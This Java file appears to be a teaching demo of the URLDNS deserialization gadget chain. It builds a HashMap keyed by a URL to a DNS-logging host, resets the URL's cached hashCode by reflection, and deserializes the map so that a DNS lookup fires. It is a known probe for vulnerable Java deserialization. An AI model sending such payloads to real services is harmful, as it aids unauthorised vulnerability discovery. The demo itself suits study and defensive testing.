import java.io.*;
import java.lang.reflect.Field;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;

import static sun.reflect.misc.FieldUtil.getField;

public class URLDNSDemo {
    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        //初始节点，先实例化一个URLStreamHandler的对象
        java.net.URLStreamHandler handler = new URLStreamHandler() {
            protected URLConnection openConnection(URL u) throws IOException {
                return null;
            }
        };

        //过程节点URL_hashCode
        URL url=new URL(null, "http://851d02e0.dns.1433.eu.org", handler);


        // 最终节点
        HashMap hashMap=new HashMap();
        hashMap.put(url,"1");

        //反射修改hashCode的值
        Field field =URL.class.getDeclaredField("hashCode");
        field.setAccessible(true);
        field.set(url,-1);


        //序列化和反序列化
        ByteArrayOutputStream out=new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(out);
        objectOutputStream.writeObject(hashMap);
        ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(out.toByteArray()));
        in.readObject();
    }
}
